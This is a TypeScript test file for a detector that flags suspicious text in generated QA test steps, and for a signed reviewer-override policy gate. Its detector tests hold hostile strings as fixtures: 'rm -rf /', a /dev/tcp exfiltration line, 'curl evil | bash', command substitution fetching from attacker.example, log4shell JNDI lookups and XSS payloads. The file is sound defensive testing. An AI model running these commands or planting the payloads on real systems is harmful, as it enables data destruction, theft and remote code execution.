/**
 * Tests for `semantic-content-sanitization.ts` (Issue #1413).
 *
 * Covers:
 *   - Each deny-list category produces the expected `SemanticSuspicionMatch`.
 *   - Benign QC step text never trips the detector (false-positive guard).
 *   - Edge cases: empty / whitespace / null-byte / very long inputs.
 *   - `recordSemanticContentOverride` validates inputs before touching the store.
 *   - `extractSemanticContentOverrides` rebuilds the override map deterministically
 *     from a persisted event log, with later events superseding earlier ones.
 *   - `effectiveSemanticContentBlock` keeps non-overridden errors blocking.
 */

import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import fc from "fast-check";

import {
  REVIEW_GATE_SCHEMA_VERSION,
  TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  TEST_INTELLIGENCE_CONTRACT_VERSION,
  type GeneratedTestCaseList,
  type ReviewEvent,
  type TestCaseCoverageReport,
  type TestCasePolicyProfile,
  type TestCaseValidationIssue,
  type TestCaseValidationReport,
} from "../contracts/index.js";
import { evaluatePolicyGate } from "./policy-gate.js";
import { cloneEuBankingDefaultProfile } from "./policy-profile.js";
import { createFileSystemReviewStore } from "./review-store.js";
import {
  createSignedSemanticContentOverrideEntry,
  detectSuspiciousContent,
  effectiveSemanticContentBlock,
  extractSemanticContentOverrides,
  listSemanticContentOverrides,
  partitionSemanticContentOverridesForValidation,
  recordSemanticContentOverride,
  SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
  SEMANTIC_CONTENT_OVERRIDE_MAX_JUSTIFICATION_LENGTH,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_EXPIRES_AT_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNATURE_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNATURE_KEY_ID_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNED_AT_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_VERIFIED_SIGNATURE_KEY,
  SEMANTIC_SUSPICION_CATEGORIES,
  type OverrideAuthorityProvider,
  type SemanticContentOverrideEntry,
} from "./semantic-content-sanitization.js";

const GENERATED_AT = "2026-04-26T10:00:00.000Z";
const FUTURE_AT = "2026-04-27T10:00:00.000Z";
const OVERRIDE_AUTHORITY: OverrideAuthorityProvider = {
  hmacSecret: "override-secret-1",
  now: () => Date.parse(GENERATED_AT),
  keyId: "primary",
};

// ---------------------------------------------------------------------------
// Detector unit tests
// ---------------------------------------------------------------------------

test("detector: empty string returns null", () => {
  assert.equal(detectSuspiciousContent(""), null);
});

test("detector: whitespace-only string returns null", () => {
  assert.equal(detectSuspiciousContent("   \t \n  "), null);
});

test("detector: benign step text returns null", () => {
  for (const benign of [
    "Submit",
    "Enter the IBAN in the form",
    "Click the 'Confirm payment' button and wait for the receipt",
    "User sees error 'Invalid amount'",
    "Open the dashboard and verify the latest transaction is shown",
    "Type 1234 and press Enter",
    "Order ID 7890 is displayed",
    "rm the cart entry",
    // Label-shaped strings using "data:" / "javascript:" must NOT trip:
    "Test data: [REDACTED:IBAN]",
    "Order data: see attached file",
    "Recommendation: use javascript: only when a custom protocol handler",
  ]) {
    assert.equal(
      detectSuspiciousContent(benign),
      null,
      `benign string was flagged: ${benign}`,
    );
  }
});

test("detector: shell metacharacter shapes flagged as shell_metacharacters", () => {
  for (const value of [
    "rm -rf /",
    "rm -rf /var/lib/app",
    "echo bad | sh",
    "curl evil | bash",
    "cat secrets > /dev/tcp/10.0.0.1/4444",
    "mkfifo /tmp/p",
    "nc -l 4444",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "shell_metacharacters", value);
  }
});

test("detector: command substitution shapes flagged as command_substitution", () => {
  for (const value of [
    "$(whoami)",
    "wait for $(curl attacker.example/payload.sh)",
    "echo `id`",
    "${IFS}",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "command_substitution", value);
  }
});

test("detector: JNDI/log4shell payloads flagged as jndi_log4shell", () => {
  for (const value of [
    "${jndi:ldap://attacker.example/a}",
    "${jndi:rmi://x}",
    "${ ${lower:j}ndi:ldap://x }",
    "${::-j}${::-n}${::-d}${::-i}",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "jndi_log4shell", value);
  }
});

test("detector: long base64 run flagged as encoded_payload_base64", () => {
  const longBase64 =
    "QUJDREVGRzEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGRzEyMzQ=";
  const match = detectSuspiciousContent(longBase64);
  assert.ok(match !== null);
  assert.equal(match.category, "encoded_payload_base64");
});

test("detector: short base64-shape passes (<64 chars)", () => {
  assert.equal(detectSuspiciousContent("dGVzdA=="), null);
  assert.equal(detectSuspiciousContent("ABC123"), null);
});

test("detector: long hex run flagged as encoded_payload_hex", () => {
  const sha1ish = "a".repeat(40);
  const match = detectSuspiciousContent(sha1ish);
  assert.ok(match !== null);
  assert.equal(match.category, "encoded_payload_hex");
});

test("detector: short hex passes (<40 chars)", () => {
  assert.equal(detectSuspiciousContent("abcdef0123"), null);
});

test("detector: <script> tag flagged as script_tag", () => {
  for (const value of [
    "<script>alert(1)</script>",
    "<sCrIpT src='evil.js'>",
    "<script>",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "script_tag", value);
  }
});

test("detector: inline event handler flagged as html_event_handler", () => {
  for (const value of [
    "<div onclick=alert(1)>",
    `<img src=x onerror="evil()" />`,
    "<a onmouseover='x()'>",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "html_event_handler", value);
  }
});

test("detector: dangerous URL schemes flagged as dangerous_url_scheme", () => {
  for (const value of [
    "click javascript:alert(1)",
    "open data:text/plain,deadbeef",
    "vbscript:msgbox 1",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "dangerous_url_scheme", value);
  }
});

test("detector: detection order — JNDI/script_tag take precedence over URL scheme", () => {
  // `data:` + `<script>` triggers script_tag (intentionally; XSS shape is
  // the more specific match).
  const m = detectSuspiciousContent("use data:text/html,<script>x()</script>");
  assert.ok(m !== null);
  assert.equal(m.category, "script_tag");
});

test("detector: matchedSnippet is bounded to 64 chars", () => {
  const long = `rm -rf /${"x".repeat(500)}`;
  const match = detectSuspiciousContent(long);
  assert.ok(match !== null);
  assert.ok(match.matchedSnippet.length <= 64);
});

test("detector: input longer than 16k is clipped without crash", () => {
  const big = "a".repeat(20_000) + "rm -rf /";
  // The bytes after the clip are unreachable; the test verifies no throw.
  assert.doesNotThrow(() => detectSuspiciousContent(big));
});

test("detector: SEMANTIC_SUSPICION_CATEGORIES is the closed list", () => {
  assert.deepEqual([...SEMANTIC_SUSPICION_CATEGORIES].sort(), [
    "command_substitution",
    "dangerous_url_scheme",
    "encoded_payload_base64",
    "encoded_payload_hex",
    "html_event_handler",
    "jndi_log4shell",
    "script_tag",
    "shell_metacharacters",
  ]);
});

// ---------------------------------------------------------------------------
// Override recording + extraction
// ---------------------------------------------------------------------------

const buildListForOverride = (): GeneratedTestCaseList => ({
  schemaVersion: "1.0.0",
  jobId: "job-1",
  testCases: [
    {
      id: "tc-1",
      sourceJobId: "job-1",
      contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
      schemaVersion: "1.0.0",
      promptTemplateVersion: "1.0.0",
      title: "T",
      objective: "O",
      level: "system",
      type: "functional",
      priority: "p1",
      riskCategory: "low",
      technique: "use_case",
      preconditions: [],
      testData: [],
      steps: [{ index: 1, action: "rm -rf /", expected: "x" }],
      expectedResults: ["x"],
      figmaTraceRefs: [{ screenId: "s-1" }],
      assumptions: [],
      openQuestions: [],
      qcMappingPreview: { exportable: true },
      qualitySignals: {
        coveredFieldIds: [],
        coveredActionIds: [],
        coveredValidationIds: [],
        coveredNavigationIds: [],
        confidence: 0.9,
      },
      reviewState: "draft",
      audit: {
        jobId: "job-1",
        generatedAt: GENERATED_AT,
        contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
        schemaVersion: "1.0.0",
        promptTemplateVersion: "1.0.0",
        redactionPolicyVersion: "1.0.0",
        visualSidecarSchemaVersion: "1.0.0",
        cacheHit: false,
        cacheKey: "k",
        inputHash: "0".repeat(64),
        promptHash: "0".repeat(64),
        schemaHash: "0".repeat(64),
      },
    },
  ],
});

const buildEvent = (
  overrides: Partial<ReviewEvent> & {
    testCaseId: string;
    metadata: ReviewEvent["metadata"];
    actor: string;
    id: string;
    sequence: number;
    at: string;
  },
): ReviewEvent => ({
  schemaVersion: REVIEW_GATE_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  jobId: "job-1",
  kind: "note",
  fromState: "needs_review",
  toState: "needs_review",
  ...overrides,
});

const buildSignedOverrideEntry = (
  overrides: Partial<SemanticContentOverrideEntry> & {
    path?: string;
    testCaseId?: string;
  } = {},
): SemanticContentOverrideEntry => {
  const path = overrides.path ?? "$.testCases[0].steps[0].action";
  const testCaseId = overrides.testCaseId ?? "tc-1";
  const entry = createSignedSemanticContentOverrideEntry({
    jobId: "job-1",
    testCaseId,
    path,
    category: "shell_metacharacters",
    justification: "reviewed and approved for adversarial smoke coverage",
    actor: "alice",
    signedAt: GENERATED_AT,
    authority: OVERRIDE_AUTHORITY,
  });
  return { ...entry, ...overrides };
};

const buildOverrideMap = (
  entry: SemanticContentOverrideEntry,
  path = "$.testCases[0].steps[0].action",
  testCaseId = "tc-1",
) =>
  new Map([[testCaseId, new Map([[path, entry]])]]);

const buildOverrideMetadata = (
  entry: SemanticContentOverrideEntry,
  path = "$.testCases[0].steps[0].action",
) => ({
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
    SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: path,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: entry.category,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: entry.justification,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNED_AT_KEY]: entry.signedAt,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNATURE_KEY]: entry.signature.digest,
  [SEMANTIC_CONTENT_OVERRIDE_METADATA_VERIFIED_SIGNATURE_KEY]:
    entry.verifiedSignature,
  ...(entry.signature.keyId !== undefined
    ? {
        [SEMANTIC_CONTENT_OVERRIDE_METADATA_SIGNATURE_KEY_ID_KEY]:
          entry.signature.keyId,
      }
    : {}),
  ...(entry.expiresAt !== undefined
    ? {
        [SEMANTIC_CONTENT_OVERRIDE_METADATA_EXPIRES_AT_KEY]: entry.expiresAt,
      }
    : {}),
});

test("recordSemanticContentOverride: refuses empty actor / justification / path / testCaseId", async () => {
  const dir = await mkdtemp(join(tmpdir(), "sem-override-"));
  try {
    const store = createFileSystemReviewStore({ destinationDir: dir });
    const baseInput = {
      jobId: "job-1",
      testCaseId: "tc-1",
      path: "$.testCases[0].steps[0].action",
      category: "shell_metacharacters" as const,
      actor: "alice",
      justification: "intentional admin smoke-test step",
      at: GENERATED_AT,
      authority: OVERRIDE_AUTHORITY,
    };
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        actor: "",
      }),
      { ok: false, code: "actor_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        justification: "  ",
      }),
      { ok: false, code: "justification_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, { ...baseInput, path: "" }),
      { ok: false, code: "path_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        testCaseId: "",
      }),
      { ok: false, code: "test_case_id_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        justification: "x".repeat(
          SEMANTIC_CONTENT_OVERRIDE_MAX_JUSTIFICATION_LENGTH + 1,
        ),
      }),
      { ok: false, code: "justification_too_long" },
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("extractSemanticContentOverrides: ignores non-override notes; later events supersede earlier ones", () => {
  const earlierEntry = buildSignedOverrideEntry({ justification: "first" });
  const laterEntry = buildSignedOverrideEntry({
    actor: "bob",
    justification: "second",
    signedAt: FUTURE_AT,
  });
  const earlier = buildEvent({
    id: "evt-a",
    sequence: 1,
    actor: "alice",
    at: "2026-04-26T10:00:00.000Z",
    testCaseId: "tc-1",
    metadata: buildOverrideMetadata(earlierEntry),
  });
  const later = buildEvent({
    id: "evt-b",
    sequence: 2,
    actor: "bob",
    at: "2026-04-26T11:00:00.000Z",
    testCaseId: "tc-1",
    metadata: buildOverrideMetadata(laterEntry),
  });
  const irrelevantNote = buildEvent({
    id: "evt-c",
    sequence: 3,
    actor: "carol",
    at: "2026-04-26T11:30:00.000Z",
    testCaseId: "tc-1",
    metadata: { reason: "general comment" },
  });

  const map = extractSemanticContentOverrides([earlier, later, irrelevantNote]);
  assert.equal(map.size, 1);
  const paths = map.get("tc-1");
  assert.ok(paths !== undefined);
  assert.equal(paths.size, 1);
  assert.ok(paths.has("$.testCases[0].steps[0].action"));
  assert.equal(
    paths.get("$.testCases[0].steps[0].action")?.justification,
    "second",
  );

  const list = listSemanticContentOverrides([earlier, later, irrelevantNote]);
  assert.equal(list.length, 1);
  assert.equal(list[0]?.justification, "second");
  assert.equal(list[0]?.actor, "bob");
});

test("extractSemanticContentOverrides: keeps replayable signed events and drops malformed path/category metadata", () => {
  const invalidEntry = buildSignedOverrideEntry({
    actor: "",
    signature: {
      algorithm: "hmac-sha256",
      digest: "",
    },
    verifiedSignature: false,
  });
  const e1 = buildEvent({
    id: "evt-1",
    sequence: 1,
    actor: "alice",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: "",
      ...buildOverrideMetadata(buildSignedOverrideEntry()),
    },
  });
  const e2 = buildEvent({
    id: "evt-2",
    sequence: 2,
    actor: "alice",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: "p",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "not-a-category",
    },
  });
  const e3 = buildEvent({
    id: "evt-3",
    sequence: 3,
    actor: "",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: buildOverrideMetadata(invalidEntry, "p"),
  });
  const map = extractSemanticContentOverrides([e1, e2, e3]);
  assert.equal(map.size, 1);
  assert.equal(map.get("tc-1")?.get("p")?.verifiedSignature, false);
  assert.equal(map.get("tc-1")?.get("p")?.actor, "");
});

// ---------------------------------------------------------------------------
// effectiveSemanticContentBlock + policy-gate integration
// ---------------------------------------------------------------------------

const semanticIssue = (path: string): TestCaseValidationIssue => ({
  testCaseId: "tc-1",
  path,
  code: "semantic_suspicious_content",
  severity: "error",
  message: "shell_metacharacters: matches destructive shell-command shape",
});

const buildValidationReport = (
  issues: TestCaseValidationIssue[],
): TestCaseValidationReport => ({
  schemaVersion: TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  totalTestCases: 1,
  errorCount: issues.filter((i) => i.severity === "error").length,
  warningCount: issues.filter((i) => i.severity === "warning").length,
  blocked: issues.some((i) => i.severity === "error"),
  issues,
});

test("effectiveSemanticContentBlock: covered semantic finding stops blocking", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  assert.equal(report.blocked, true);
  const map = buildOverrideMap(buildSignedOverrideEntry());
  assert.equal(effectiveSemanticContentBlock(report, map), false);
});

test("effectiveSemanticContentBlock: uncovered path keeps blocking", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
    semanticIssue("$.testCases[0].expectedResults[0]"),
  ]);
  const map = buildOverrideMap(buildSignedOverrideEntry());
  assert.equal(effectiveSemanticContentBlock(report, map), true);
});

test("effectiveSemanticContentBlock: non-semantic error always keeps blocking", () => {
  const report = buildValidationReport([
    {
      testCaseId: "tc-1",
      path: "$.testCases[0].steps",
      code: "step_action_empty",
      severity: "error",
      message: "step action must not be whitespace-only",
    },
  ]);
  const map = buildOverrideMap(buildSignedOverrideEntry());
  assert.equal(effectiveSemanticContentBlock(report, map), true);
});

test("partitionSemanticContentOverridesForValidation: keeps only verified semantic matches", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
    {
      testCaseId: "tc-1",
      path: "$.testCases[0].title",
      code: "title_empty",
      severity: "error",
      message: "title must not be whitespace-only",
    },
  ]);
  const stale = new Map([
    [
      "tc-1",
      new Map([
        [
          "$.testCases[0].steps[0].action",
          buildSignedOverrideEntry(),
        ],
        [
          "$.testCases[0].title",
          buildSignedOverrideEntry({ path: "$.testCases[0].title" }),
        ],
        [
          "$.testCases[0].expectedResults[0]",
          buildSignedOverrideEntry({
            path: "$.testCases[0].expectedResults[0]",
          }),
        ],
      ]),
    ],
    [
      "tc-unknown",
      new Map([
        [
          "$.testCases[9].steps[0].action",
          buildSignedOverrideEntry({
            testCaseId: "tc-unknown",
            path: "$.testCases[9].steps[0].action",
          }),
        ],
      ]),
    ],
  ]);
  const filtered = partitionSemanticContentOverridesForValidation(
    report,
    stale,
    OVERRIDE_AUTHORITY,
  ).valid;
  assert.deepEqual(
    [...(filtered.get("tc-1")?.keys() ?? [])],
    ["$.testCases[0].steps[0].action"],
  );
  assert.equal(filtered.has("tc-unknown"), false);
});

test("effectiveSemanticContentBlock: category-mismatched replay override stays blocking", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const categoryMismatch = new Map([
    [
      "tc-1",
      new Map([
        [
          "$.testCases[0].steps[0].action",
          buildSignedOverrideEntry({ category: "script_tag" }),
        ],
      ]),
    ],
  ]);
  assert.equal(effectiveSemanticContentBlock(report, categoryMismatch), true);
});

const buildCoverage = (): TestCaseCoverageReport => ({
  schemaVersion: "1.0.0",
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  policyProfileId: "eu-banking-default",
  totalTestCases: 1,
  fieldCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  actionCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  fieldLifecycleCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  validationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  navigationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  traceCoverage: { total: 1, withTrace: 1, ratio: 1 },
  negativeCaseCount: 0,
  validationCaseCount: 0,
  boundaryCaseCount: 0,
  accessibilityCaseCount: 0,
  workflowCaseCount: 0,
  positiveCaseCount: 1,
  assumptionsRatio: 0,
  openQuestionsCount: 0,
  duplicatePairs: [],
});

test("policy-gate: respects semanticContentOverrides — overridden case downgraded to needs_review with annotated rule", () => {
  const list = buildListForOverride();
  const intent = {
    version: "1.0.0",
    source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
    screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
    detectedFields: [],
    detectedActions: [],
    detectedValidations: [],
    detectedNavigation: [],
    inferredBusinessObjects: [],
    risks: [],
    assumptions: [],
    openQuestions: [],
    piiIndicators: [],
    redactions: [],
  } as const;
  const profile: TestCasePolicyProfile = cloneEuBankingDefaultProfile();
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const coverage = buildCoverage();
  const overridePath = "$.testCases[0].steps[0].action";
  const overrideEntry = createSignedSemanticContentOverrideEntry({
    jobId: "job-1",
    testCaseId: "tc-1",
    path: overridePath,
    category: "shell_metacharacters",
    justification:
      "intentional ops smoke test for destructive-command alerting; reviewed under change request CR-1413",
    actor: "alice@bank.example",
    signedAt: GENERATED_AT,
    authority: OVERRIDE_AUTHORITY,
  });

  const reportWithoutOverride = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
  });
  const decisionWithout = reportWithoutOverride.decisions.find(
    (d) => d.testCaseId === "tc-1",
  );
  assert.equal(decisionWithout?.decision, "blocked");
  assert.ok(
    decisionWithout?.violations.some(
      (v) =>
        v.outcome === "semantic_suspicious_content" &&
        v.rule === "validation:semantic_suspicious_content" &&
        v.severity === "error",
    ),
    "without override the violation must be a blocking error",
  );

  const overrides = new Map<string, Map<string, ReturnType<typeof createSignedSemanticContentOverrideEntry>>>([
    ["tc-1", new Map([[overridePath, overrideEntry]])],
  ]);
  const reportWithOverride = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
    semanticContentOverrides: overrides,
    overrideAuthorityProvider: OVERRIDE_AUTHORITY,
  });
  const decisionWith = reportWithOverride.decisions.find(
    (d) => d.testCaseId === "tc-1",
  );
  assert.equal(
    decisionWith?.decision,
    "needs_review",
    "override must downgrade decision from blocked to needs_review",
  );
  assert.ok(
    decisionWith?.violations.some(
      (v) =>
        v.outcome === "semantic_suspicious_content" &&
        v.rule === "validation:semantic_suspicious_content:overridden" &&
        v.severity === "warning",
    ),
    "override must annotate the violation rule and downgrade severity",
  );
  assert.equal(reportWithOverride.blocked, false);
});

test("policy-gate: override map without matching path leaves the case blocked", () => {
  const list = buildListForOverride();
  const intent = {
    version: "1.0.0",
    source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
    screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
    detectedFields: [],
    detectedActions: [],
    detectedValidations: [],
    detectedNavigation: [],
    inferredBusinessObjects: [],
    risks: [],
    assumptions: [],
    openQuestions: [],
    piiIndicators: [],
    redactions: [],
  } as const;
  const profile = cloneEuBankingDefaultProfile();
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const coverage = buildCoverage();
  const overrides = new Map<string, Map<string, ReturnType<typeof createSignedSemanticContentOverrideEntry>>>([
    [
      "tc-1",
      new Map([
        [
          "$.testCases[0].expectedResults[0]",
          createSignedSemanticContentOverrideEntry({
            jobId: "job-1",
            testCaseId: "tc-1",
            path: "$.testCases[0].expectedResults[0]",
            category: "shell_metacharacters",
            justification:
              "intentional ops smoke test for destructive-command alerting; reviewed under change request CR-1413",
            actor: "alice@bank.example",
            signedAt: GENERATED_AT,
            authority: OVERRIDE_AUTHORITY,
          }),
        ],
      ]),
    ],
  ]);
  const result = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
    semanticContentOverrides: overrides,
    overrideAuthorityProvider: OVERRIDE_AUTHORITY,
  });
  const decision = result.decisions.find((d) => d.testCaseId === "tc-1");
  assert.equal(decision?.decision, "blocked");
});

test("policy-gate: missing authority provider rejects otherwise signed overrides fail-closed", () => {
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const result = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildListForOverride(),
    intent: {
      version: "1.0.0",
      source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
      screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
      detectedFields: [],
      detectedActions: [],
      detectedValidations: [],
      detectedNavigation: [],
      inferredBusinessObjects: [],
      risks: [],
      assumptions: [],
      openQuestions: [],
      piiIndicators: [],
      redactions: [],
    },
    profile: cloneEuBankingDefaultProfile(),
    validation,
    coverage: buildCoverage(),
    semanticContentOverrides: buildOverrideMap(buildSignedOverrideEntry()),
  });
  const decision = result.decisions.find((d) => d.testCaseId === "tc-1");
  assert.equal(decision?.decision, "blocked");
  assert.ok(
    decision?.violations.some(
      (v) =>
        v.rule === "policy:override_invalid" &&
        v.severity === "error" &&
        v.reason.includes("authority provider missing"),
    ),
  );
});

test("policy-gate: expired override entries are rejected fail-closed", () => {
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const result = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildListForOverride(),
    intent: {
      version: "1.0.0",
      source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
      screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
      detectedFields: [],
      detectedActions: [],
      detectedValidations: [],
      detectedNavigation: [],
      inferredBusinessObjects: [],
      risks: [],
      assumptions: [],
      openQuestions: [],
      piiIndicators: [],
      redactions: [],
    },
    profile: cloneEuBankingDefaultProfile(),
    validation,
    coverage: buildCoverage(),
    semanticContentOverrides: buildOverrideMap(
      buildSignedOverrideEntry({ expiresAt: "2026-04-25T09:59:59.000Z" }),
    ),
    overrideAuthorityProvider: OVERRIDE_AUTHORITY,
  });
  const decision = result.decisions.find((d) => d.testCaseId === "tc-1");
  assert.equal(decision?.decision, "blocked");
  assert.ok(
    decision?.violations.some(
      (v) =>
        v.rule === "policy:override_invalid" &&
        v.reason.includes("has expired"),
    ),
  );
});

test("policy-gate: property-based invalid signatures are all rejected", () => {
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const valid = buildSignedOverrideEntry();
  fc.assert(
    fc.property(fc.stringMatching(/^[0-9a-f]{64}$/u), (digest) => {
      fc.pre(digest !== valid.signature.digest);
      const result = evaluatePolicyGate({
        jobId: "job-1",
        generatedAt: GENERATED_AT,
        list: buildListForOverride(),
        intent: {
          version: "1.0.0",
          source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
          screens: [
            { screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } },
          ],
          detectedFields: [],
          detectedActions: [],
          detectedValidations: [],
          detectedNavigation: [],
          inferredBusinessObjects: [],
          risks: [],
          assumptions: [],
          openQuestions: [],
          piiIndicators: [],
          redactions: [],
        },
        profile: cloneEuBankingDefaultProfile(),
        validation,
        coverage: buildCoverage(),
        semanticContentOverrides: buildOverrideMap({
          ...valid,
          signature: { ...valid.signature, digest },
        }),
        overrideAuthorityProvider: OVERRIDE_AUTHORITY,
      });
      const decision = result.decisions.find((d) => d.testCaseId === "tc-1");
      return (
        decision?.decision === "blocked" &&
        decision.violations.some(
          (v) =>
            v.rule === "policy:override_invalid" &&
            v.reason.includes("failed verification"),
        )
      );
    }),
    { numRuns: 1000 },
  );
});

// ---------------------------------------------------------------------------
// End-to-end: detect → record override via store → re-evaluate → blocked flips
// ---------------------------------------------------------------------------

test("end-to-end: reviewer override note recorded via store flips effective block", async () => {
  const dir = await mkdtemp(join(tmpdir(), "sem-override-e2e-"));
  try {
    const store = createFileSystemReviewStore({ destinationDir: dir });
    await store.seedSnapshot({
      jobId: "job-1",
      generatedAt: GENERATED_AT,
      list: buildListForOverride(),
      policy: {
        schemaVersion: "1.0.0",
        contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
        generatedAt: GENERATED_AT,
        jobId: "job-1",
        policyProfileId: "eu-banking-default",
        policyProfileVersion: "1.0.0",
        totalTestCases: 1,
        approvedCount: 0,
        blockedCount: 1,
        needsReviewCount: 0,
        blocked: true,
        decisions: [
          {
            testCaseId: "tc-1",
            decision: "blocked",
            violations: [],
          },
        ],
        jobLevelViolations: [],
      },
    });

    const result = await recordSemanticContentOverride(store, {
      jobId: "job-1",
      testCaseId: "tc-1",
      path: "$.testCases[0].steps[0].action",
      category: "shell_metacharacters",
      actor: "alice@bank.example",
      justification:
        "intentional ops smoke test for destructive-command alerting; reviewed under change request CR-1413",
      at: GENERATED_AT,
      authority: OVERRIDE_AUTHORITY,
    });
    assert.equal(result.ok, true, JSON.stringify(result));

    const events = await store.listEvents("job-1");
    const overrideEvents = events.filter(
      (e) =>
        e.kind === "note" &&
        e.metadata?.[SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY] ===
          SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
    );
    assert.equal(overrideEvents.length, 1);
    assert.equal(
      overrideEvents[0]?.metadata?.[
        SEMANTIC_CONTENT_OVERRIDE_METADATA_VERIFIED_SIGNATURE_KEY
      ],
      true,
    );

    const overrides = extractSemanticContentOverrides(events);
    const validation = buildValidationReport([
      semanticIssue("$.testCases[0].steps[0].action"),
    ]);
    assert.equal(validation.blocked, true);
    assert.equal(effectiveSemanticContentBlock(validation, overrides), false);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
